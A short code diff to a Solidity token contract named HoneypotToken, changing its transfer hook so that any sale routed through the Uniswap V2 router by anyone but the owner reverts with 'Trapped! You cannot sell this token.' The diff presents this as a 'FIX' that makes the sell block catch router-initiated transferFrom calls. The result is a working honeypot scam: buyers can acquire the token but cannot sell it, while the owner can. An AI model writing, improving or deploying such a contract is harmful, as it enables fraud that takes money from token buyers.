@@ -10,11 +10,14 @@ contract HoneypotToken is ERC20, Ownable {
 
     // This function intercepts transfers
     function _update(address from, address to, uint256 value) internal override {
-        // IF we are selling (to Uniswap Router) AND not the owner
-        // REVERT the transaction!
-        if (to == 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D && from != owner()) {
+        // FIX: Check if the ROUTER is the one trying to move the tokens.
+        // If the Router calls transferFrom, and it's not the owner, BLOCK IT.
+        address ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+        
+        if (msg.sender == ROUTER && from != owner()) {
             revert("Trapped! You cannot sell this token.");
         }
+        
         super._update(from, to, value);
     }
 }
